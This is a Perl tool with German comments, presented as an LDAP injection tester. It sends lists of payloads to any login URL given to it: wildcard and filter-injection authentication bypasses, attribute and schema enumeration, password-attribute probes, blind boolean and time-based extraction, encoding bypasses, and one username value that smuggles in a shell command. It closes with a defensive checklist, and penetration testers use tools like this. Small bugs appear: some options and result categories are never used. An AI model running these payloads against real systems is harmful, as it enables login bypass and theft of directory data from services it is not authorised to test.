#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use Getopt::Long;
use URI::Escape;
use JSON;
use Time::HiRes qw(time);
use MIME::Base64;

# ======================================================================
# LDAP INJECTION TESTER
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Testet Webapplikationen auf LDAP Injection Schwachstellen
# Version: 1.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# Testet:
#   • Basic LDAP Injection (admin*, admin*)(uid=*)
#   • AND/OR Injection (&(uid=*)(uid=*)) (|(uid=*)(uid=*))
#   • Blind LDAP Injection (Zeitbasiert, Boolean-based)
#   • LDAP Metadata Extraction (Schema, Attribute)
#   • Bypass von Filtern (Null-Byte, Encodings)
# ======================================================================

my $verbose = 0;
my $output_file = "";
my $target_url = "";
my $username_param = "username";
my $password_param = "password";
my $test_user = "admin";
my $request_type = "POST";
my $blind_delay = 2; # Sekunden für Blind Tests
my $timeout = 10;
my $detect_errors = 1;

GetOptions(
    "verbose|v" => \$verbose,
    "output|o=s" => \$output_file,
    "url=s" => \$target_url,
    "username-param=s" => \$username_param,
    "password-param=s" => \$password_param,
    "user=s" => \$test_user,
    "method=s" => \$request_type,
    "blind-delay=i" => \$blind_delay,
    "timeout=i" => \$timeout,
    "no-error-detection" => sub { $detect_errors = 0; },
    "help|h" => sub { print_help(); exit 0; }
);

if (!$target_url) {
    print "Fehler: Target-URL ist erforderlich!\n";
    print_help();
    exit 1;
}

print "╔════════════════════════════════════════════════════════════╗\n";
print "║                  LDAP INJECTION TESTER                     ║\n";
print "║                    Version 1.0                              ║\n";
print "╚════════════════════════════════════════════════════════════╝\n\n";

print "[INFO] Ziel: $target_url\n";
print "[INFO] Username-Parameter: $username_param\n";
print "[INFO] Password-Parameter: $password_param\n";
print "[INFO] Test-User: $test_user\n\n";

my %results = (
    basic_injection => [],
    advanced_injection => [],
    blind_injection => [],
    metadata_leak => [],
    error_based => [],
    recommendations => []
);

my $ua = LWP::UserAgent->new(
    ssl_opts => { verify_hostname => 0 },
    agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    timeout => $timeout,
    max_redirect => 0,
    cookie_jar => {}
);

# ======================================================================
# TEST 1: BASELINE - NORMALER LOGIN
# ======================================================================
print "[TEST 1] Baseline - Normaler Login-Versuch\n";
print "-" x 50, "\n";

my $baseline_response = send_login($test_user, "wrongpassword");
my $baseline_content = $baseline_response ? $baseline_response->decoded_content : "";
my $baseline_time = measure_login_time($test_user, "wrongpassword");
my $baseline_success = $baseline_response && $baseline_response->is_success ? 1 : 0;

print "  Normaler Response: " . ($baseline_response ? $baseline_response->code : "keine Response") . "\n";
print "  Response-Zeit: ${baseline_time}ms\n";
print "  Erfolg: " . ($baseline_success ? "JA" : "NEIN") . "\n\n";

# Typische LDAP-Fehlermeldungen erkennen
my @ldap_errors = (
    "LDAP:", "ldap_", "javax.naming", "com.sun.jndi", "Invalid DN syntax",
    "malformed filter", "bad search filter", "protocol error", "size limit exceeded",
    "Administrative limit exceeded", "busy", "unavailable", "unwilling to perform",
    "no such object", "alias problem", "invalid DN syntax", "is not defined",
    "entry already exists", "object class violation", "naming violation",
    "constraint violation", "type or value exists", "invalid syntax"
);

# ======================================================================
# TEST 2: BASIC LDAP INJECTION PAYLOADS
# ======================================================================
print "[TEST 2] Basic LDAP Injection Payloads\n";
print "-" x 50, "\n";

my @basic_payloads = (
    # Basic Auth Bypass
    { name => "always_true_1", user => "*", pass => "*", desc => "Wildcard Bypass" },
    { name => "always_true_2", user => "*)(&", pass => "*", desc => "Always True mit &" },
    { name => "always_true_3", user => "*)(|", pass => "*", desc => "Always True mit |" },
    { name => "admin_star", user => "admin*", pass => "*", desc => "Admin mit Wildcard" },
    { name => "admin_wildcard", user => "admin*", pass => "*)", desc => "Admin mit schließender Klammer" },

    # AND Injection
    { name => "and_injection_1", user => "admin)(&)", pass => "password", desc => "AND Injection mit leeren Bedingungen" },
    { name => "and_injection_2", user => "admin)(&(uid=*", pass => "password", desc => "AND Injection offen" },

    # OR Injection
    { name => "or_injection_1", user => "admin)(|(uid=*", pass => "password", desc => "OR Injection offen" },
    { name => "or_injection_2", user => "admin)(|(uid=*))", pass => "password", desc => "OR Injection geschlossen" },

    # Null-Byte Injection
    { name => "null_byte_1", user => "admin\0", pass => "password", desc => "Null-Byte Terminierung" },
    { name => "null_byte_2", user => "admin%00", pass => "password", desc => "URL-kodiertes Null-Byte" },

    # Kommentar-Bypass
    { name => "comment_1", user => "admin)(&))//", pass => "password", desc => "Kommentar mit //" },
    { name => "comment_2", user => "admin)(&))--", pass => "password", desc => "Kommentar mit --" },
);

print "  Teste " . scalar(@basic_payloads) . " Basic Payloads...\n\n";

foreach my $payload (@basic_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $response = send_login($payload->{user}, $payload->{pass});
    my $time = measure_login_time($payload->{user}, $payload->{pass});

    my $result = {
        type => "basic",
        payload => $payload->{name},
        user => $payload->{user},
        pass => $payload->{pass},
        status => $response ? $response->code : 0,
        time => $time,
        success => $response && $response->is_success ? 1 : 0,
        error_detected => 0
    };

    # Prüfe auf LDAP-Fehlermeldungen
    if ($response && $detect_errors) {
        my $content = $response->decoded_content || "";
        foreach my $error (@ldap_errors) {
            if ($content =~ /$error/i) {
                $result->{error_detected} = 1;
                $result->{error_message} = $error;
                last;
            }
        }
    }

    # Prüfe auf Injection-Erfolg
    if ($response && $response->is_success && !$baseline_success) {
        # Login erfolgreich obwohl Baseline fehlschlug!
        print "    ✅ INJECTION ERFOLGREICH! Login mit $payload->{user} / $payload->{pass}\n";
        $result->{injection_success} = 1;
        push @{$results{basic_injection}}, $result;
        push @{$results{recommendations}}, "LDAP Injection möglich mit Payload: $payload->{user}";
    } elsif ($result->{error_detected}) {
        print "    ⚠️  LDAP-Fehler erkannt: $result->{error_message}\n";
        push @{$results{error_based}}, $result;
    } else {
        print "    Kein Erfolg\n" if $verbose > 1;
    }

    # Kleine Pause
    select(undef, undef, undef, 0.1);
}

# ======================================================================
# TEST 3: ADVANCED LDAP INJECTION
# ======================================================================
print "\n[TEST 3] Advanced LDAP Injection\n";
print "-" x 50, "\n";

my @advanced_payloads = (
    # Komplexe Filter
    { name => "complex_and", user => "admin)(&(uid=admin", pass => "password", desc => "Komplexer AND-Filter" },
    { name => "complex_or", user => "admin)(|(uid=admin", pass => "password", desc => "Komplexer OR-Filter" },
    { name => "nested", user => "admin)(&(|(uid=admin", pass => "password", desc => "Verschachtelte Filter" },

    # Attribute Enumeration
    { name => "attr_user", user => "*)(uid=*", pass => "x", desc => "User-Attribut Enumeration" },
    { name => "attr_cn", user => "*)(cn=*", pass => "x", desc => "CN-Attribut Enumeration" },
    { name => "attr_mail", user => "*)(mail=*", pass => "x", desc => "Mail-Attribut Enumeration" },
    { name => "attr_sn", user => "*)(sn=*", pass => "x", desc => "SN-Attribut Enumeration" },

    # ObjectClass Enumeration
    { name => "obj_user", user => "*)(objectClass=user", pass => "x", desc => "User ObjectClass" },
    { name => "obj_person", user => "*)(objectClass=person", pass => "x", desc => "Person ObjectClass" },
    { name => "obj_inetorg", user => "*)(objectClass=inetOrgPerson", pass => "x", desc => "inetOrgPerson ObjectClass" },

    # Schema Enumeration
    { name => "schema_attr", user => "*)(attributeTypes=*", pass => "x", desc => "Schema Attribute" },
    { name => "schema_obj", user => "*)(objectClasses=*", pass => "x", desc => "Schema ObjectClasses" },

    # Passwort-Attacken
    { name => "pwd_length", user => "admin)(password=*", pass => "x", desc => "Passwort Länge testen" },
    { name => "pwd_hash", user => "admin)(userPassword=*", pass => "x", desc => "Passwort-Hash" },
);

print "  Teste " . scalar(@advanced_payloads) . " Advanced Payloads...\n\n";

foreach my $payload (@advanced_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $response = send_login($payload->{user}, $payload->{pass});
    my $time = measure_login_time($payload->{user}, $payload->{pass});

    my $result = {
        type => "advanced",
        payload => $payload->{name},
        user => $payload->{user},
        pass => $payload->{pass},
        status => $response ? $response->code : 0,
        time => $time,
        success => $response && $response->is_success ? 1 : 0,
        error_detected => 0
    };

    # Prüfe auf LDAP-Fehler
    if ($response && $detect_errors) {
        my $content = $response->decoded_content || "";
        foreach my $error (@ldap_errors) {
            if ($content =~ /$error/i) {
                $result->{error_detected} = 1;
                $result->{error_message} = $error;

                # Bei Schema/Attribute-Fehlern: Möglicher Metadata Leak
                if ($error =~ /schema|attribute|objectclass/i) {
                    print "    📊 METADATA LEAK: $error\n";
                    push @{$results{metadata_leak}}, $result;
                }
                last;
            }
        }
    }

    if ($result->{error_detected}) {
        print "    ⚠️  LDAP-Fehler: $result->{error_message}\n";
    }

    select(undef, undef, undef, 0.1);
}

# ======================================================================
# TEST 4: BLIND LDAP INJECTION
# ======================================================================
print "\n[TEST 4] Blind LDAP Injection (Time-based)\n";
print "-" x 50, "\n";

my @blind_payloads = (
    # Time-based Blind
    { name => "time_sleep_1", user => "*)(uid=*))\$(sleep 5)\$", pass => "x", desc => "Command Injection Style" },
    { name => "time_sleep_2", user => "*)(uid=*))|(sleep=5", pass => "x", desc => "LDAP Sleep (theoretisch)" },
    { name => "time_delay", user => "admin)(&(uid=admin)(sn=admin))", pass => "x", desc => "Komplexer Filter als Zeitbasis" },

    # Boolean-based Blind
    { name => "bool_true", user => "*)(uid=*", pass => "x", desc => "Boolean True - sollte true sein" },
    { name => "bool_false", user => "xxxx)(uid=xxxx", pass => "x", desc => "Boolean False - sollte false sein" },
    { name => "bool_admin", user => "admin)(uid=admin", pass => "x", desc => "Admin existiert?" },

    # Extraction Tests
    { name => "extract_1char", user => "admin)(uid=a*", pass => "x", desc => "Ersten Buchstaben raten" },
    { name => "extract_2char", user => "admin)(uid=ad*", pass => "x", desc => "Zweiten Buchstaben raten" },
);

print "  Teste " . scalar(@blind_payloads) . " Blind Payloads...\n\n";

foreach my $payload (@blind_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $start_time = time();
    my $response = send_login($payload->{user}, $payload->{pass});
    my $end_time = time();
    my $duration = ($end_time - $start_time) * 1000; # in ms

    my $result = {
        type => "blind",
        payload => $payload->{name},
        user => $payload->{user},
        pass => $payload->{pass},
        status => $response ? $response->code : 0,
        duration => $duration,
        success => $response && $response->is_success ? 1 : 0,
    };

    # Zeitbasierte Injection erkennen
    if ($duration > $baseline_time * 2 && $duration > 1000) {
        print "    ⏰ MÖGLICHE ZEITBASISCHE INJECTION! Dauer: ${duration}ms (Baseline: ${baseline_time}ms)\n";
        $result->{time_based} = 1;
        push @{$results{blind_injection}}, $result;
        push @{$results{recommendations}}, "Zeitbasierte Blind LDAP Injection möglich - Input sanitieren";
    }

    select(undef, undef, undef, 0.2);
}

# ======================================================================
# TEST 5: ENCODING BYPASS
# ======================================================================
print "\n[TEST 5] Encoding Bypass Tests\n";
print "-" x 50, "\n";

my @encoding_payloads = (
    # URL Encoding
    { name => "url_encoded_1", user => "%2a%29%28%26", pass => "%2a", desc => "URL-kodiert: *)(&" },
    { name => "url_encoded_2", user => "%61%64%6d%69%6e%2a", pass => "%2a", desc => "URL-kodiert: admin*" },

    # Double Encoding
    { name => "double_encoded", user => "%252a%2529%2528%2526", pass => "%252a", desc => "Double-kodiert" },

    # Base64
    { name => "base64_1", user => encode_base64("admin*)(&"), pass => encode_base64("*"), desc => "Base64-kodiert" },

    # HTML Entities
    { name => "html_entities", user => "admin&amp;*)(&amp;", pass => "&amp;*", desc => "HTML Entities" },

    # Unicode Normalization
    { name => "unicode_1", user => "admin\u2044*", pass => "*", desc => "Unicode-Bypass" },
);

foreach my $payload (@encoding_payloads) {
    print "  Payload: $payload->{name} - $payload->{desc}\n" if $verbose;

    my $response = send_login($payload->{user}, $payload->{pass});

    if ($response && $response->is_success && !$baseline_success) {
        print "    ✅ ENCODING BYPASS ERFOLGREICH!\n";
        push @{$results{basic_injection}}, {
            type => "encoding",
            payload => $payload->{name},
            user => $payload->{user},
            pass => $payload->{pass},
            success => 1
        };
    }
}

# ======================================================================
# AUSWERTUNG
# ======================================================================
print "\n" . "=" x 60 . "\n";
print "ERGEBNIS-ZUSAMMENFASSUNG\n";
print "=" x 60 . "\n\n";

print "BASIC INJECTION: ";
if (@{$results{basic_injection}}) {
    print "❌ GEFÄHRDET (" . scalar(@{$results{basic_injection}}) . " Payloads erfolgreich)\n";
} else {
    print "✅ SICHER (Keine Basic Injection gefunden)\n";
}

print "ADVANCED INJECTION: ";
if (@{$results{advanced_injection}}) {
    print "⚠️  MÖGLICH\n";
} else {
    print "✅ KEINE\n";
}

print "BLIND INJECTION: ";
if (@{$results{blind_injection}}) {
    print "⚠️  MÖGLICH (" . scalar(@{$results{blind_injection}}) . " zeitbasierte Anomalien)\n";
} else {
    print "✅ KEINE\n";
}

print "METADATA LEAKS: ";
if (@{$results{metadata_leak}}) {
    print "⚠️  GEFUNDEN (" . scalar(@{$results{metadata_leak}}) . ")\n";
} else {
    print "✅ KEINE\n";
}

print "ERROR-BASED INFO: ";
if (@{$results{error_based}}) {
    print "⚠️  LDAP-Fehler sichtbar\n";
} else {
    print "✅ Fehler versteckt\n";
}

print "\nSCHWACHSTELLEN:\n";
my @vulns = @{$results{basic_injection}};
if (@vulns) {
    print "  • KRITISCH: LDAP Injection möglich - Authentifizierung kann umgangen werden!\n";
    foreach my $vuln (@vulns) {
        print "    - Payload: $vuln->{user} / $vuln->{pass}\n";
    }
}

if (@{$results{metadata_leak}}) {
    print "  • MITTEL: LDAP Metadata Leaks - Angreifer kann Schema auslesen\n";
}

if (@{$results{blind_injection}}) {
    print "  • MITTEL: Blind LDAP Injection möglich - Daten können extrahiert werden\n";
}

print "\nEMPFEHLUNGEN:\n";
my %unique_recs;
foreach my $rec (@{$results{recommendations}}) {
    $unique_recs{$rec} = 1;
}

if (keys %unique_recs) {
    foreach my $rec (keys %unique_recs) {
        print "  • $rec\n";
    }
} else {
    print "  • Keine LDAP Injection gefunden - gute Konfiguration!\n";
}

print "\nSICHERHEITS-CHECKLISTE:\n";
print "  • [ ] LDAP-Input sanitieren (Escape Filter: ( ) * & | !)\n";
print "  • [ ] Prepared Statements / Parameterized Queries verwenden\n";
print "  • [ ] Keine LDAP-Fehlermeldungen anzeigen\n";
print "  • [ ] Least Privilege für LDAP-Bind-Account\n";
print "  • [ ] Anonyme Binds deaktivieren\n";
print "  • [ ] Rate Limiting implementieren\n";

# Report speichern
if ($output_file) {
    save_report();
    print "\nReport gespeichert in: $output_file\n";
}

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub send_login {
    my ($user, $pass) = @_;

    my $request;

    if ($request_type eq "POST") {
        $request = HTTP::Request->new('POST', $target_url);
        $request->content_type('application/x-www-form-urlencoded');
        $request->content("$username_param=" . uri_escape($user) . "&$password_param=" . uri_escape($pass));
    } elsif ($request_type eq "GET") {
        my $url = "$target_url?$username_param=" . uri_escape($user) . "&$password_param=" . uri_escape($pass);
        $request = HTTP::Request->new('GET', $url);
    } elsif ($request_type eq "JSON") {
        $request = HTTP::Request->new('POST', $target_url);
        $request->content_type('application/json');
        $request->content(encode_json({ $username_param => $user, $password_param => $pass }));
    }

    return $ua->request($request);
}

sub measure_login_time {
    my ($user, $pass) = @_;

    my $start = time();
    my $response = send_login($user, $pass);
    my $end = time();

    return ($end - $start) * 1000;
}

sub save_report {
    open(my $fh, '>', $output_file) or die "Kann Datei nicht erstellen: $!";

    print $fh "LDAP INJECTION TEST REPORT\n";
    print $fh "==========================\n\n";
    print $fh "Getestet am: " . localtime() . "\n";
    print $fh "Target: $target_url\n\n";

    print $fh "ERGEBNISSE:\n";
    print $fh "-----------\n\n";

    print $fh "Basic Injection: " . scalar(@{$results{basic_injection}}) . " erfolgreich\n";
    print $fh "Blind Injection: " . scalar(@{$results{blind_injection}}) . " Anomalien\n";
    print $fh "Metadata Leaks: " . scalar(@{$results{metadata_leak}}) . "\n";
    print $fh "Error-based: " . scalar(@{$results{error_based}}) . "\n\n";

    print $fh "GEFUNDENE PAYLOADS:\n";
    foreach my $v (@{$results{basic_injection}}) {
        print $fh "  • $v->{user} / $v->{pass}\n";
    }

    print $fh "\nEMPFEHLUNGEN:\n";
    my %seen;
    foreach my $rec (@{$results{recommendations}}) {
        print $fh "  • $rec\n" unless $seen{$rec}++;
    }

    close $fh;
}

sub print_help {
    print <<'HELP';

LDAP INJECTION TESTER
=====================

USAGE:
  perl ldap_injection_tester.pl --url URL [OPTIONEN]

ERFORDERLICH:
  --url URL         Login-URL oder Endpunkt

OPTIONEN:
  --username-param NAME   Parameter für Username (default: "username")
  --password-param NAME   Parameter für Passwort (default: "password")
  --user USER             Test-Benutzername (default: "admin")
  --method METHOD         HTTP-Methode: POST, GET, JSON (default: POST)
  --blind-delay SECONDS   Verzögerung für Blind Tests (default: 2)
  --timeout SECONDS       Timeout für Requests (default: 10)
  --no-error-detection    Fehlererkennung deaktivieren
  -v, --verbose           Ausführliche Ausgabe
  -o, --output FILE       Report in Datei speichern
  -h, --help              Diese Hilfe anzeigen

BEISPIELE:
  # Standard Login testen
  perl ldap_injection_tester.pl --url https://example.com/login

  # JSON-API testen
  perl ldap_injection_tester.pl --url https://api.example.com/auth --method JSON --username-param email

  # Mit Blind-Tests
  perl ldap_injection_tester.pl --url https://example.com/login --blind-delay 5 -v -o report.txt

LDAP INJECTION PAYLOADS:
  • Basic: *)(uid=*
  • AND: admin)(&)
  • OR: admin)(|(uid=*)
  • Wildcard: admin*
  • Null-Byte: admin%00
  • Kommentar: admin)(&))//

TYPISCHE LDAP-FEHLER:
  • "LDAP:", "javax.naming", "com.sun.jndi"
  • "malformed filter", "bad search filter"
  • "invalid DN syntax", "no such object"
  • "object class violation", "constraint violation"

SCHUTZMASSNAHMEN:
  • Input sanitieren: ldap_escape() in PHP, encodeForLDAP() in Java
  • Prepared Statements verwenden
  • Eigene Fehlermeldungen, keine LDAP-Details
  • Least Privilege für LDAP-Bind
  • Anonyme Binds deaktivieren
HELP
}
